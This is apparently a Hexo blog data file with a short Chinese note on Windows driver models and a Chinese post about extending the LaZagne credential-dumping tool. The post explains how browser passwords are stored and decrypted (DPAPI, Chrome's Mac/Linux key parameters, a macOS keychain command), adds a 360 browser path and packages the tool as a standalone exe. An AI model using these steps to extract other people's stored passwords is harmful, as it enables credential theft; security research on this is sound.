rel=\"noopener\">http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html</a></p>\n<p>1.首先，先从基础的东西说起，开发WINDOWS下的驱动程序，需要一个专门的开发包，如：开发JAVA程序，我们可能需要一个JDK，开发WINDOWS应用程序，我们需要WINDOWS的SDK，现在开发WINDOWS下的驱动程序，我们需要一个DDK/WDK。</p>\n<p>2.DDK（Driver Developer Kit）和WDK（Windows Driver Kit）的区别：</p>\n<p>这个要说说驱动相关的一些历史:</p>\n<pre><code>1).95/98/ME下，驱动模型为：Vxd，相关资料可以看《编程高手箴言》的前几个章节，里面有很详细的介绍，虽然这个东西已经过时，但大概看看还是会增长见识的。\n\n2).2000/XP/2003下，Windows采用WDM驱动模型（Windows Driver Model），开发2000/XP/2003的驱动开发包为：DDK。\n\nWDM驱动无非是微软在NT式驱动之上进行了扩充，过滤驱动也不例外 。\n\n3).Vista及以后版本，采用了WDF驱动模型（Windows Driver Foudation），对应的开发包：WDK。</code></pre><p>其实<strong>WDK可以看做是DDK的升级版本，现在一般的WDK是包含以前DDK相关的功能，现在XP下也可以用WDK开发驱动，WDK能编译出2000-2008的各种驱动</strong>。</p>\n<p>3.Vxd驱动文件扩展名为：.vxd。</p>\n<p>WDM和WDF驱动文件扩展名为：.sys。</p>\n<p>4、WDM 是 Win32设备驱动程序体系结构。</p>\n<p>件驱动的驱动程序开发框架，大大降低了开发难度。从现在开始，掌握Windows设备驱动程序的开发人员，由过去的“专业”人士，将变为“普通”大众。</p>\n<p>WDF驱动程序包括两个类型，一个是内核级的，称为KMDF（Kernel-Mode Driver Framework），为SYS文件；另一个是用户级的，称为UMDF（User-Mode Driver Framework），为DLL文件。</p>\n<p>5、DDK 和WDK</p>\n<p><strong>DDK是基于wdm驱动模型的，而WDK是基于WDF驱动模型的</strong>，wdm驱动模型和wdf驱动模型的最大的区别是：</p>\n<pre><code>1)wdf驱动框架对WDM进行了一次封装，WDF框架就好像C++中的基类一样，且这个基类中的model,IO model ,pnp和电源管理模型;且提供了一些与操作系统相关的处理函数，这些函数好像C++中的虚函数一样，WDF驱动中能够对这些函数进行override；特别是Pnp管理和电源管理！基本上都由WDF框架做了，而WDF的功能驱动几乎不要对它进行特殊的处理；\n\n2)WDF驱动模型 与WDM驱动模型的另外一个主要区别是：\n\nWDF 驱动采用队列进行IO处理，而WDM中将所有的IO操作都用默认的队列进行处理，如果要进行IRp同步，必须使用StartIO；\n\n3)WDF是面向对象的，而WDM是面向过程的，WDF提供对象的封装，如将IRP封装成WDFREQUEST，对象提供方法和Event。\n\n5）usb设备的读写；\n\n当应用程序使用ReadFile或WriteFile进行读写时，首先将\n\nUsbBuildInterruptOrBulkTransferRequest将构建urb请求，然后通过IoCallDriver发送给底层usb 总线驱动；\n\n对于WDF来说，WdfUsbTargetPipeFormatRequestForRead 格式化读请求，然后使用WdfRequestSend  发送给底层Usb总线驱动；\n\n对WDM和WDF的usb的读写都可以设置完成例程；</code></pre>"},{"title":"Lazagne导出密码","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png","_content":"\n\n\n### 前言\n\n**LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），开发这款工具的目的是为了寻找计算机中最常用软件的密码**\n\n### 工具源码介绍\n\n项目来源 https://github.com/AlessandroZ/LaZagne\n\n增加了**360浏览器**的模块\n\n目前已经支持提取密码的软件列表\n\n\n\n|                                      | Windows                                                      | Linux                                                        | Mac                    |\n| :----------------------------------: | :----------------------------------------------------------- | ------------------------------------------------------------ | ---------------------- |\n|               Browsers               | 7Star<br> Amigo<br> BlackHawk<br> Brave<br> Centbrowser<br> Chedot<br> Chrome Canary<br> Chromium<br> Coccoc<br> Comodo Dragon<br> Comodo IceDragon<br> Cyberfox<br> Elements Browser<br> Epic Privacy Browser<br> Firefox<br> Google Chrome<br> Icecat<br> K-Meleon<br> Kometa<br> Opera<br> Orbitum<br> Sputnik<br> Torch<br> Uran<br> Vivaldi<br> 360Chrom<br> | Chrome<br> Firefox<br> Opera                                 | Chrome<br> Firefox     |\n|                Chats                 | Pidgin<br> Psi<br> Skype                                     | Pidgin<br> Psi                                               |                        |\n|              Databases               | DBVisualizer<br> Postgresql<br> Robomongo<br> Squirrel<br> SQLdevelopper | DBVisualizer<br> Squirrel<br> SQLdevelopper                  |                        |\n|                Games                 | GalconFusion<br> Kalypsomedia<br> RogueTale<br> Turba        |                                                              |                        |\n|                 Git                  | Git for Windows                                              |                                                              |                        |\n|                Mails                 | Outlook<br> Thunderbird                                      | Clawsmail<br> Thunderbird                                    |                        |\n|                Maven                 | Maven Apache<br>                                             |                                                              |                        |\n|          Dumps from memory           | Keepass<br> Mimikatz method                                  | System Password                                              |                        |\n|              Multimedia              | EyeCON<br>                                                   |                                                              |                        |\n|                 PHP                  | Composer<br>                                                 |                                                              |                        |\n|                 SVN                  | Tortoise                                                     |                                                              |                        |\n|               Sysadmin               | Apache Directory Studio<br> CoreFTP<br> CyberDuck<br> FileZilla<br> FileZilla Server<br> FTPNavigator<br> OpenSSH<br> OpenVPN<br> KeePass Configuration Files (KeePass1, KeePass2)<br> PuttyCM<br>RDPManager<br> VNC<br> WinSCP<br> Windows Subsystem for Linux | Apache Directory Studio<br> AWS<br>  Docker<br> Environnement variable<br> FileZilla<br> gFTP<br> History files<br> Shares <br> SSH private keys <br> KeePass Configuration Files (KeePassX, KeePass2) <br> Grub |                        |\n|                 Wifi                 | Wireless Network                                             | Network Manager<br> WPA Supplicant                           |                        |\n| Internal mechanism passwords storage | Autologon<br> MSCache<br> Credential Files<br> Credman <br> DPAPI Hash <br> Hashdump (LM/NT)<br> LSA secret<br> Vault Files | GNOME Keyring<br> Kwallet<br> Hashdump                       | Keychains<br> Hashdump |\n\n\n\n### 获取浏览器原理\n\n浏览器在用户输入密码登录某个网站后，会有提示询问你是否保存密码，方便下次登录\n\n![image-20200317133729443](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317133729443.png)\n\n这也存在安全问题，如果有人获得了执行shell的权限，读取浏览器中密码文件，完全可以通过撞库拿到更多的密码。\n\n下面就360浏览器介绍怎么提取密码 \n\n密码存储目录：\n\n`%LOCALAPPDATA%\\360Chrome\\Chrome\\User Data\\Default\\Login Data`\n\n浏览器中使用数据库的方式保存账号，密码和对应的网站\n\n通过sql管理工具打开，这里使用SQLiteStudio打开\n\n![image-20200317135718468](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317135718468.png)\n\n\n\n在WIndows上\n\n​\t浏览器借助Windows内置的`CryptProtectData`函数对密码进行加密。现在，虽然这是使用三重DES算法并创建特定于用户的密钥来加密数据，但是只要您登录到与加密该数据的用户相同的帐户，就可以将其解密。功能有一个对应的API，与之相反。`CryptUnprotectData`，它解密数据。显然，这在尝试解密存储的密码时将非常有用。\n\n\n\n> #### Mac/Linux Implementation\n>\n> Encryption Scheme: AES-128 CBC with a constant salt and constant iterations. The decryption key is a PBKDF2 key generated with the following:\n>\n> - salt is b'saltysalt'\n> - key length is 16\n> - iv is 16 bytes of space b' ' * 16\n> - on Mac OSX:\n>   - password is in keychain under Chrome Safe Storage\n>     - I use the excellent keyring package to get the password\n>     - You could also use bash: security find-generic-password -w -s \"Chrome Safe Storage\"\n>   - number of iterations is 1003\n> - on Linux:\n>   - password is peanuts\n>   - number of iterations is 1\n\n\n\n接下来使用调用`CryptUnprotectData`进行解密就行了，网上代码也很多\n\n**360浏览器和Google chrom保存密码的方式是一样的**\n\n比如，python提取chrom密码\n\nhttps://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py\n\n\n\n### 使用开发\n\n该工程使用纯py编写，流程很容易看懂，看到现在还没支持360浏览器，但是用户数也挺多的，所以尝试增加以下这个模块。\n\n**使用前请认真阅读ReadMe**\n\n安装必要的库，我这里环境是**Python 2.7.13**\n\n`pip install -r requirements.txt`\n\n下面的每个文件夹都是不同软件的相关模块\n\n![image-20200317180124260](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317180124260.png)\n\n\n\n要修改浏览器模块的数据，就要修改相应模块\n\n因为有很多浏览器保存密码的方式都是形同的，这里作者分了4类 分别是**chromium_based** **ie**  **mozilla** **ucbrowser** \n\n大多数浏览器都是**chromium_based**格式存储密码，360浏览器也是\n\n所以只需要增加一项配置文件就行了\n\nhttps://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216\n\n在里面新加一句\n\n`(u'360ces', u'{LOCALAPPDATA}\\\\360Chrome\\\\Chrome\\\\User Data'),`\n\n测试如下\n\n![image-20200317181302873](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png)\n\n\n\n不同环境库肯定不同，这里将他打包发布\n\n可以使用py2exe或pyinstaller\n\n由于py2exe不支持python2.7了，所以这里使用pyinstaller安装\n\n`pip install pyinstaller`\n\n也很简单，单文件模式输出就行\n\n`pyinstaller -F  laZagne.py`\n\n![image-20200317182426210](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317182426210.png)\n\n\n\n最后拷贝dist下的成品exe就行了，但是因为用了import *的方式，所以很多无关的代码也写入了程序，这里暂时不能减少体积，如果要改，需要将每个py文件导入的模块细化，改为from _ import XXX 的格式，调用方式也需要修改。\n\n","source":"_posts/LaZagne导出密码.md","raw":"---\ntitle: Lazagne导出密码\ntags: [安全工具]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png\n---\n\n\n\n### 前言\n\n**LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），开发这款工具的目的是为了寻找计算机中最常用软件的密码**\n\n### 工具源码介绍\n\n项目来源 https://github.com/AlessandroZ/LaZagne\n\n增加了**360浏览器**的模块\n\n目前已经支持提取密码的软件列表\n\n\n\n|                                      | Windows                                                      | Linux                                                        | Mac                    |\n| :----------------------------------: | :----------------------------------------------------------- | ------------------------------------------------------------ | ---------------------- |\n|               Browsers               | 7Star<br> Amigo<br> BlackHawk<br> Brave<br> Centbrowser<br> Chedot<br> Chrome Canary<br> Chromium<br> Coccoc<br> Comodo Dragon<br> Comodo IceDragon<br> Cyberfox<br> Elements Browser<br> Epic Privacy Browser<br> Firefox<br> Google Chrome<br> Icecat<br> K-Meleon<br> Kometa<br> Opera<br> Orbitum<br> Sputnik<br> Torch<br> Uran<br> Vivaldi<br> 360Chrom<br> | Chrome<br> Firefox<br> Opera                                 | Chrome<br> Firefox     |\n|                Chats                 | Pidgin<br> Psi<br> Skype                                     | Pidgin<br> Psi                                               |                        |\n|              Databases               | DBVisualizer<br> Postgresql<br> Robomongo<br> Squirrel<br> SQLdevelopper | DBVisualizer<br> Squirrel<br> SQLdevelopper                  |                        |\n|                Games                 | GalconFusion<br> Kalypsomedia<br> RogueTale<br> Turba        |                                                              |                        |\n|                 Git                  | Git for Windows                                              |                                                              |                        |\n|                Mails                 | Outlook<br> Thunderbird                                      | Clawsmail<br> Thunderbird                                    |                        |\n|                Maven                 | Maven Apache<br>                                             |                                                              |                        |\n|          Dumps from memory           | Keepass<br> Mimikatz method                                  | System Password                                              |                        |\n|              Multimedia              | EyeCON<br>                                                   |                                                              |                        |\n|                 PHP                  | Composer<br>                                                 |                                                              |                        |\n|                 SVN                  | Tortoise                                                     |                                                              |                        |\n|               Sysadmin               | Apache Directory Studio<br> CoreFTP<br> CyberDuck<br> FileZilla<br> FileZilla Server<br> FTPNavigator<br> OpenSSH<br> OpenVPN<br> KeePass Configuration Files (KeePass1, KeePass2)<br> PuttyCM<br>RDPManager<br> VNC<br> WinSCP<br> Windows Subsystem for Linux | Apache Directory Studio<br> AWS<br>  Docker<br> Environnement variable<br> FileZilla<br> gFTP<br> History files<br> Shares <br> SSH private keys <br> KeePass Configuration Files (KeePassX, KeePass2) <br> Grub |                        |\n|                 Wifi                 | Wireless Network                                             | Network Manager<br> WPA Supplicant                           |                        |\n| Internal mechanism passwords storage | Autologon<br> MSCache<br> Credential Files<br> Credman <br> DPAPI Hash <br> Hashdump (LM/NT)<br> LSA secret<br> Vault Files | GNOME Keyring<br> Kwallet<br> Hashdump                       | Keychains<br> Hashdump |\n\n\n\n### 获取浏览器原理\n\n浏览器在用户输入密码登录某个网站后，会有提示询问你是否保存密码，方便下次登录\n\n![image-20200317133729443](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317133729443.png)\n\n这也存在安全问题，如果有人获得了执行shell的权限，读取浏览器中密码文件，完全可以通过撞库拿到更多的密码。\n\n下面就360浏览器介绍怎么提取密码 \n\n密码存储目录：\n\n`%LOCALAPPDATA%\\360Chrome\\Chrome\\User Data\\Default\\Login Data`\n\n浏览器中使用数据库的方式保存账号，密码和对应的网站\n\n通过sql管理工具打开，这里使用SQLiteStudio打开\n\n![image-20200317135718468](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317135718468.png)\n\n\n\n在WIndows上\n\n​\t浏览器借助Windows内置的`CryptProtectData`函数对密码进行加密。现在，虽然这是使用三重DES算法并创建特定于用户的密钥来加密数据，但是只要您登录到与加密该数据的用户相同的帐户，就可以将其解密。功能有一个对应的API，与之相反。`CryptUnprotectData`，它解密数据。显然，这在尝试解密存储的密码时将非常有用。\n\n\n\n> #### Mac/Linux Implementation\n>\n> Encryption Scheme: AES-128 CBC with a constant salt and constant iterations. The decryption key is a PBKDF2 key generated with the following:\n>\n> - salt is b'saltysalt'\n> - key length is 16\n> - iv is 16 bytes of space b' ' * 16\n> - on Mac OSX:\n>   - password is in keychain under Chrome Safe Storage\n>     - I use the excellent keyring package to get the password\n>     - You could also use bash: security find-generic-password -w -s \"Chrome Safe Storage\"\n>   - number of iterations is 1003\n> - on Linux:\n>   - password is peanuts\n>   - number of iterations is 1\n\n\n\n接下来使用调用`CryptUnprotectData`进行解密就行了，网上代码也很多\n\n**360浏览器和Google chrom保存密码的方式是一样的**\n\n比如，python提取chrom密码\n\nhttps://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py\n\n\n\n### 使用开发\n\n该工程使用纯py编写，流程很容易看懂，看到现在还没支持360浏览器，但是用户数也挺多的，所以尝试增加以下这个模块。\n\n**使用前请认真阅读ReadMe**\n\n安装必要的库，我这里环境是**Python 2.7.13**\n\n`pip install -r requirements.txt`\n\n下面的每个文件夹都是不同软件的相关模块\n\n![image-20200317180124260](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317180124260.png)\n\n\n\n要修改浏览器模块的数据，就要修改相应模块\n\n因为有很多浏览器保存密码的方式都是形同的，这里作者分了4类 分别是**chromium_based** **ie**  **mozilla** **ucbrowser** \n\n大多数浏览器都是**chromium_based**格式存储密码，360浏览器也是\n\n所以只需要增加一项配置文件就行了\n\nhttps://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216\n\n在里面新加一句\n\n`(u'360ces', u'{LOCALAPPDATA}\\\\360Chrome\\\\Chrome\\\\User Data'),`\n\n测试如下\n\n![image-20200317181302873](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png)\n\n\n\n不同环境库肯定不同，这里将他打包发布\n\n可以使用py2exe或pyinstaller\n\n由于py2exe不支持python2.7了，所以这里使用pyinstaller安装\n\n`pip install pyinstaller`\n\n也很简单，单文件模式输出就行\n\n`pyinstaller -F  laZagne.py`\n\n![image-20200317182426210](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317182426210.png)\n\n\n\n最后拷贝dist下的成品exe就行了，但是因为用了import *的方式，所以很多无关的代码也写入了程序，这里暂时不能减少体积，如果要改，需要将每个py文件导入的模块细化，改为from _ import XXX 的格式，调用方式也需要修改。\n\n","slug":"LaZagne导出密码","published":1,"date":"2020-03-18T01:56:51.261Z","updated":"2020-03-18T02:03:26.604Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw628000kccuqk8v1wx3k","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p><strong>LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），开发这款工具的目的是为了寻找计算机中最常用软件的密码</strong></p>\n<h3 id=\"工具源码介绍\"><a href=\"#工具源码介绍\" class=\"headerlink\" title=\"工具源码介绍\"></a>工具源码介绍</h3><p>项目来源 <a href=\"https://github.com/AlessandroZ/LaZagne\" target=\"_blank\" rel=\"noopener\">https://github.com/AlessandroZ/LaZagne</a></p>\n<p>增加了<strong>360浏览器</strong>的模块</p>\n<p>目前已经支持提取密码的软件列表</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"left\">Windows</th>\n<th>Linux</th>\n<th>Mac</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Browsers</td>\n<td align=\"left\">7Star<br> Amigo<br> BlackHawk<br> Brave<br> Centbrowser<br> Chedot<br> Chrome Canary<br> Chromium<br> Coccoc<br> Comodo Dragon<br> Comodo IceDragon<br> Cyberfox<br> Elements Browser<br> Epic Privacy Browser<br> Firefox<br> Google Chrome<br> Icecat<br> K-Meleon<br> Kometa<br> Opera<br> Orbitum<br> Sputnik<br> Torch<br> Uran<br> Vivaldi<br> 360Chrom<br></td>\n<td>Chrome<br> Firefox<br> Opera</td>\n<td>Chrome<br> Firefox</td>\n</tr>\n<tr>\n<td align=\"center\">Chats</td>\n<td align=\"left\">Pidgin<br> Psi<br> Skype</td>\n<td>Pidgin<br> Psi</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Databases</td>\n<td align=\"left\">DBVisualizer<br> Postgresql<br> Robomongo<br> Squirrel<br> SQLdevelopper</td>\n<td>DBVisualizer<br> Squirrel<br> SQLdevelopper</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Games</td>\n<td align=\"left\">GalconFusion<br> Kalypsomedia<br> RogueTale<br> Turba</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Git</td>\n<td align=\"left\">Git for Windows</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Mails</td>\n<td align=\"left\">Outlook<br> Thunderbird</td>\n<td>Clawsmail<br> Thunderbird</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Maven</td>\n<td align=\"left\">Maven Apache<br></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Dumps from memory</td>\n<td align=\"left\">Keepass<br> Mimikatz method</td>\n<td>System Password</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Multimedia</td>\n<td align=\"left\">EyeCON<br></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">PHP</td>\n<td align=\"left\">Composer<br></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">SVN</td>\n<td align=\"left\">Tortoise</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Sysadmin</td>\n<td align=\"left\">Apache Directory Studio<br> CoreFTP<br> CyberDuck<br> FileZilla<br> FileZilla Server<br> FTPNavigator<br> OpenSSH<br> OpenVPN<br> KeePass Configuration Files (KeePass1, KeePass2)<br> PuttyCM<br>RDPManager<br> VNC<br> WinSCP<br> Windows Subsystem for Linux</td>\n<td>Apache Directory Studio<br> AWS<br>  Docker<br> Environnement variable<br> FileZilla<br> gFTP<br> History files<br> Shares <br> SSH private keys <br> KeePass Configuration Files (KeePassX, KeePass2) <br> Grub</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Wifi</td>\n<td align=\"left\">Wireless Network</td>\n<td>Network Manager<br> WPA Supplicant</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Internal mechanism passwords storage</td>\n<td align=\"left\">Autologon<br> MSCache<br> Credential Files<br> Credman <br> DPAPI Hash <br> Hashdump (LM/NT)<br> LSA secret<br> Vault Files</td>\n<td>GNOME Keyring<br> Kwallet<br> Hashdump</td>\n<td>Keychains<br> Hashdump</td>\n</tr>\n</tbody></table>\n<h3 id=\"获取浏览器原理\"><a href=\"#获取浏览器原理\" class=\"headerlink\" title=\"获取浏览器原理\"></a>获取浏览器原理</h3><p>浏览器在用户输入密码登录某个网站后，会有提示询问你是否保存密码，方便下次登录</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317133729443.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317133729443\"></p>\n<p>这也存在安全问题，如果有人获得了执行shell的权限，读取浏览器中密码文件，完全可以通过撞库拿到更多的密码。</p>\n<p>下面就360浏览器介绍怎么提取密码 </p>\n<p>密码存储目录：</p>\n<p><code>%LOCALAPPDATA%\\360Chrome\\Chrome\\User Data\\Default\\Login Data</code></p>\n<p>浏览器中使用数据库的方式保存账号，密码和对应的网站</p>\n<p>通过sql管理工具打开，这里使用SQLiteStudio打开</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317135718468.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317135718468\"></p>\n<p>在WIndows上</p>\n<p>​    浏览器借助Windows内置的<code>CryptProtectData</code>函数对密码进行加密。现在，虽然这是使用三重DES算法并创建特定于用户的密钥来加密数据，但是只要您登录到与加密该数据的用户相同的帐户，就可以将其解密。功能有一个对应的API，与之相反。<code>CryptUnprotectData</code>，它解密数据。显然，这在尝试解密存储的密码时将非常有用。</p>\n<blockquote>\n<h4 id=\"Mac-Linux-Implementation\"><a href=\"#Mac-Linux-Implementation\" class=\"headerlink\" title=\"Mac/Linux Implementation\"></a>Mac/Linux Implementation</h4><p>Encryption Scheme: AES-128 CBC with a constant salt and constant iterations. The decryption key is a PBKDF2 key generated with the following:</p>\n<ul>\n<li>salt is b’saltysalt’</li>\n<li>key length is 16</li>\n<li>iv is 16 bytes of space b’ ‘ * 16</li>\n<li>on Mac OSX:<ul>\n<li>password is in keychain under Chrome Safe Storage<ul>\n<li>I use the excellent keyring package to get the password</li>\n<li>You could also use bash: security find-generic-password -w -s “Chrome Safe Storage”</li>\n</ul>\n</li>\n<li>number of iterations is 1003</li>\n</ul>\n</li>\n<li>on Linux:<ul>\n<li>password is peanuts</li>\n<li>number of iterations is 1</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<p>接下来使用调用<code>CryptUnprotectData</code>进行解密就行了，网上代码也很多</p>\n<p><strong>360浏览器和Google chrom保存密码的方式是一样的</strong></p>\n<p>比如，python提取chrom密码</p>\n<p><a href=\"https://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py\" target=\"_blank\" rel=\"noopener\">https://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py</a></p>\n<h3 id=\"使用开发\"><a href=\"#使用开发\" class=\"headerlink\" title=\"使用开发\"></a>使用开发</h3><p>该工程使用纯py编写，流程很容易看懂，看到现在还没支持360浏览器，但是用户数也挺多的，所以尝试增加以下这个模块。</p>\n<p><strong>使用前请认真阅读ReadMe</strong></p>\n<p>安装必要的库，我这里环境是<strong>Python 2.7.13</strong></p>\n<p><code>pip install -r requirements.txt</code></p>\n<p>下面的每个文件夹都是不同软件的相关模块</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317180124260.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317180124260\"></p>\n<p>要修改浏览器模块的数据，就要修改相应模块</p>\n<p>因为有很多浏览器保存密码的方式都是形同的，这里作者分了4类 分别是<strong>chromium_based</strong> <strong>ie</strong>  <strong>mozilla</strong> <strong>ucbrowser</strong> </p>\n<p>大多数浏览器都是<strong>chromium_based</strong>格式存储密码，360浏览器也是</p>\n<p>所以只需要增加一项配置文件就行了</p>\n<p><a href=\"https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216\" target=\"_blank\" rel=\"noopener\">https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216</a></p>\n<p>在里面新加一句</p>\n<p><code>(u&#39;360ces&#39;, u&#39;{LOCALAPPDATA}\\\\360Chrome\\\\Chrome\\\\User Data&#39;),</code></p>\n<p>测试如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317181302873\"></p>\n<p>不同环境库肯定不同，这里将他打包发布</p>\n<p>可以使用py2exe或pyinstaller</p>\n<p>由于py2exe不支持python2.7了，所以这里使用pyinstaller安装</p>\n<p><code>pip install pyinstaller</code></p>\n<p>也很简单，单文件模式输出就行</p>\n<p><code>pyinstaller -F  laZagne.py</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317182426210.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317182426210\"></p>\n<p>最后拷贝dist下的成品exe就行了，但是因为用了import *的方式，所以很多无关的代码也写入了程序，这里暂时不能减少体积，如果要改，需要将每个py文件导入的模块细化，改为from _ import XXX 的格式，调用方式也需要修改。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p><strong>LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），开发这款工具的目的是为了寻找计算机中最常用软件的密码</strong></p>\n<h3 id=\"工具源码介绍\"><a href=\"#工具源码介绍\" class=\"headerlink\" title=\"工具源码介绍\"></a>工具源码介绍</h3><p>项目来源 <a href=\"https://github.com/AlessandroZ/LaZagne\" target=\"_blank\" rel=\"noopener\">https://github.com/AlessandroZ/LaZagne</a></p>\n<p>增加了<strong>360浏览器</strong>的模块</p>\n<p>目前已经支持提取密码的软件列表</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"left\">Windows</th>\n<th>Linux</th>\n<th>Mac</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Browsers</td>\n<td align=\"left\">7Star<br> Amigo<br> BlackHawk<br> Brave<br> Centbrowser<br> Chedot<br> Chrome Canary<br> Chromium<br> Coccoc<br> Comodo Dragon<br> Comodo IceDragon<br> Cyberfox<br> Elements Browser<br> Epic Privacy Browser<br> Firefox<br> Google Chrome<br> Icecat<br> K-Meleon<br> Kometa<br> Opera<br> Orbitum<br> Sputnik<br> Torch<br> Uran<br> Vivaldi<br> 360Chrom<br></td>\n<td>Chrome<br> Firefox<br> Opera</td>\n<td>Chrome<br> Firefox</td>\n</tr>\n<tr>\n<td align=\"center\">Chats</td>\n<td align=\"left\">Pidgin<br> Psi<br> Skype</td>\n<td>Pidgin<br> Psi</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Databases</td>\n<td align=\"left\">DBVisualizer<br> Postgresql<br> Robomongo<br> Squirrel<br> SQLdevelopper</td>\n<td>DBVisualizer<br> Squirrel<br> SQLdevelopper</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Games</td>\n<td align=\"left\">GalconFusion<br> Kalypsomedia<br> RogueTale<br> Turba</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Git</td>\n<td align=\"left\">Git for Windows</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Mails</td>\n<td align=\"left\">Outlook<br> Thunderbird</td>\n<td>Clawsmail<br> Thunderbird</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Maven</td>\n<td align=\"left\">Maven Apache<br></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Dumps from memory</td>\n<td align=\"left\">Keepass<br> Mimikatz method</td>\n<td>System Password</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Multimedia</td>\n<td align=\"left\">EyeCON<br></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">PHP</td>\n<td align=\"left\">Composer<br></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">SVN</td>\n<td align=\"left\">Tortoise</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Sysadmin</td>\n<td align=\"left\">Apache Directory Studio<br> CoreFTP<br> CyberDuck<br> FileZilla<br> FileZilla Server<br> FTPNavigator<br> OpenSSH<br> OpenVPN<br> KeePass Configuration Files (KeePass1, KeePass2)<br> PuttyCM<br>RDPManager<br> VNC<br> WinSCP<br> Windows Subsystem for Linux</td>\n<td>Apache Directory Studio<br> AWS<br>  Docker<br> Environnement variable<br> FileZilla<br> gFTP<br> History files<br> Shares <br> SSH private keys <br> KeePass Configuration Files (KeePassX, KeePass2) <br> Grub</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Wifi</td>\n<td align=\"left\">Wireless Network</td>\n<td>Network Manager<br> WPA Supplicant</td>\n<td></td>\n</tr>\n<tr>\n<td align=\"center\">Internal mechanism passwords storage</td>\n<td align=\"left\">Autologon<br> MSCache<br> Credential Files<br> Credman <br> DPAPI Hash <br> Hashdump (LM/NT)<br> LSA secret<br> Vault Files</td>\n<td>GNOME Keyring<br> Kwallet<br> Hashdump</td>\n<td>Keychains<br> Hashdump</td>\n</tr>\n</tbody></table>\n<h3 id=\"获取浏览器原理\"><a href=\"#获取浏览器原理\" class=\"headerlink\" 